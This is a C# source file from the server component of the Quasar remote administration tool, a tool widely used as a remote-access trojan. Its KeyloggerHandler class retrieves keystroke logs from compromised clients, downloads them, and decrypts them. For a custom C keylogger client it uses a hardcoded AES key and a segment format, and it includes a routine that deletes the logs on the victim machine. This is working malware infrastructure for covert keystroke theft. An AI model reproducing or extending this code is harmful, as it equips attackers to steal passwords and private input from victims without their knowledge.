using Quasar.Common.Cryptography;
using Quasar.Common.Helpers;
using Quasar.Common.Messages;
using Quasar.Common.Enums;
using Quasar.Common.Models;
using Quasar.Common.Networking;
using Quasar.Server.Models;
using Quasar.Server.Networking;
using System;
using System.IO;
using System.Text;

namespace Quasar.Server.Messages
{
    /// <summary>
    /// Handles messages for the interaction with the remote keylogger.
    /// </summary>
    public class KeyloggerHandler : MessageProcessorBase<string>, IDisposable
    {
        /// <summary>
        /// The client which is associated with this keylogger handler.
        /// </summary>
        private readonly Client _client;

        /// <summary>
        /// The file manager handler used to retrieve keylogger logs from the client.
        /// </summary>
        private readonly FileManagerHandler _fileManagerHandler;

        /// <summary>
        /// The remote path of the keylogger logs directory.
        /// </summary>
        private string _remoteKeyloggerDirectory;

        /// <summary>
        /// The amount of all running log transfers.
        /// </summary>
        private int _allTransfers;

        /// <summary>
        /// The amount of all completed log transfers.
        /// </summary>
        private int _completedTransfers;

        /// <summary>
        /// AES instance with hardcoded key for C client keylog decryption (same master key as remote_keylogger_aes.c).
        /// </summary>
        private static readonly Aes256 CClientAes = new Aes256("KeylogAES256Key01234567890123456");

        /// <summary>
        /// Initializes a new instance of the <see cref="KeyloggerHandler"/> class using the given client.
        /// </summary>
        /// <param name="client">The associated client.</param>
        public KeyloggerHandler(Client client) : base(true)
        {
            _client = client;
            _fileManagerHandler = new FileManagerHandler(client, "Logs\\");
            _fileManagerHandler.DirectoryChanged += DirectoryChanged;
            _fileManagerHandler.FileTransferUpdated += FileTransferUpdated;
            _fileManagerHandler.ProgressChanged += StatusUpdated;
            MessageHandler.Register(_fileManagerHandler);
        }

        /// <inheritdoc />
        public override bool CanExecute(IMessage message) => message is GetKeyloggerLogsDirectoryResponse;

        /// <inheritdoc />
        public override bool CanExecuteFrom(ISender sender) => _client.Equals(sender);

        /// <inheritdoc />
        public override void Execute(ISender sender, IMessage message)
        {
            switch (message)
            {
                case GetKeyloggerLogsDirectoryResponse logsDirectory:
                    Execute(sender, logsDirectory);
                    break;
            }
        }

        /// <summary>
        /// Retrieves the keylogger logs and begins downloading them.
        /// </summary>
        public void RetrieveLogs()
        {
            _client.Send(new GetKeyloggerLogsDirectory());
        }

        /// <summary>
        /// Deletes all keylogger log files on the remote client by removing the logs directory.
        /// </summary>
        public void DeleteLogsOnClient()
        {
            if (string.IsNullOrEmpty(_remoteKeyloggerDirectory))
            {
                OnReport("Logs directory unknown (retrieve logs first)");
                return;
            }

            _fileManagerHandler.DeleteFile(_remoteKeyloggerDirectory, FileType.Directory);
            OnReport("Requested deletion of logs on client");
        }

        private void Execute(ISender client, GetKeyloggerLogsDirectoryResponse message)
        {
            _remoteKeyloggerDirectory = message.LogsDirectory;
            client.Send(new GetDirectory {RemotePath = _remoteKeyloggerDirectory});
        }

        private string GetDownloadProgress(int allTransfers, int completedTransfers)
        {
            decimal progress = Math.Round((decimal)((double)completedTransfers / (double)allTransfers * 100.0), 2);
            return $"Downloading...({progress}%)";
        }

        private void StatusUpdated(object sender, string value)
        {
            // called when directory does not exist or access is denied
            OnReport($"No logs found ({value})");
        }

        private void DirectoryChanged(object sender, string remotePath, FileSystemEntry[] items)
        {
            /* Only consider real file entries that look like keylogger logs (.bin from C client, .html from C# client). */
            var logItems = Array.FindAll(items, i =>
                i.EntryType == FileType.File &&
                (i.Name.EndsWith(".bin", StringComparison.OrdinalIgnoreCase) ||
                 i.Name.EndsWith(".html", StringComparison.OrdinalIgnoreCase)));

            if (logItems.Length == 0)
            {
                OnReport("No logs found");
                return;
            }

            _allTransfers = logItems.Length;
            _completedTransfers = 0;
            OnReport(GetDownloadProgress(_allTransfers, _completedTransfers));

            foreach (var item in logItems)
            {
                // don't escape from download directory
                if (FileHelper.HasIllegalCharacters(item.Name))
                {
                    // disconnect malicious client
                    _client.Disconnect();
                    return;
                }

                /* Server always uses .html for keylog files; client may send .bin (C client) or .html (C#). */
                string localName = item.Name.EndsWith(".bin", StringComparison.OrdinalIgnoreCase)
                    ? Path.ChangeExtension(item.Name, ".html")
                    : item.Name;
                _fileManagerHandler.BeginDownloadFile(Path.Combine(_remoteKeyloggerDirectory, item.Name), localName, true);
            }
        }

        private void FileTransferUpdated(object sender, FileTransfer transfer)
        {
            if (transfer.Status == "Completed")
            {
                try
                {
                    _completedTransfers++;
                    string content = null;
                    /* Try C client format: [magic "KLS1"][len4][seg]... or legacy single blob. */
                    try
                    {
                        byte[] raw = File.ReadAllBytes(transfer.LocalPath);
                        if (raw.Length >= 48)
                        {
                            var sb = new StringBuilder();
                            int pos = 0;
                            int decryptedSegments = 0;
                            const byte K = (byte)'K', L = (byte)'L', S = (byte)'S', One = (byte)'1';
                            while (pos + 8 <= raw.Length)
                            {
                                if (!(raw[pos] == K && raw[pos + 1] == L && raw[pos + 2] == S && raw[pos + 3] == One))
                                {
                                    pos++;
                                    continue;
                                }

                                int segLen = raw[pos + 4] | (raw[pos + 5] << 8) | (raw[pos + 6] << 16) | (raw[pos + 7] << 24);
                                if (segLen < 48 || pos + 8 + segLen > raw.Length)
                                    break; // likely trailing partial segment while file is still being written

                                byte[] segment = new byte[segLen];
                                Buffer.BlockCopy(raw, pos + 8, segment, 0, segLen);
                                pos += 8 + segLen;
                                sb.Append(Encoding.UTF8.GetString(CClientAes.Decrypt(segment)));
                                decryptedSegments++;
                            }

                            if (decryptedSegments > 0 && sb.Length > 0)
                                content = sb.ToString();
                            else if (content == null && raw.Length >= 48)
                            {
                                // Legacy C client blob format (single encrypted payload without segment headers).
                                content = Encoding.UTF8.GetString(CClientAes.Decrypt(raw));
                            }
                        }
                    }
                    catch { /* not C client format or corrupt */ }
                    if (content == null || content.Length < 10)
                    {
                        /* Try C# client format (per-client encryption key). */
                        try
                        {
                            content = FileHelper.ReadLogFile(transfer.LocalPath, _client.Value.AesInstance);
                        }
                        catch
                        {
                            OnReport("Decryption failed for " + Path.GetFileName(transfer.LocalPath));
                            content = null;
                        }
                    }
                    if (content != null)
                        File.WriteAllText(transfer.LocalPath, content, Encoding.UTF8);
                    else
                        OnReport("Decryption failed for " + Path.GetFileName(transfer.LocalPath));

                    if (content != null)
                    {
                        OnReport(_allTransfers == _completedTransfers
                            ? "Successfully retrieved all logs"
                            : GetDownloadProgress(_allTransfers, _completedTransfers));
                    }
                }
                catch (Exception)
                {
                    OnReport("Failed to decrypt and write logs");
                }
            }
        }

        /// <summary>
        /// Disposes all managed and unmanaged resources associated with this message processor.
        /// </summary>
        public void Dispose()
        {
            Dispose(true);
            GC.SuppressFinalize(this);
        }

        protected virtual void Dispose(bool disposing)
        {
            if (disposing)
            {
                MessageHandler.Unregister(_fileManagerHandler);
                _fileManagerHandler.ProgressChanged -= StatusUpdated;
                _fileManagerHandler.FileTransferUpdated -= FileTransferUpdated;
                _fileManagerHandler.DirectoryChanged -= DirectoryChanged;
                _fileManagerHandler.Dispose();
            }
        }
    }
}
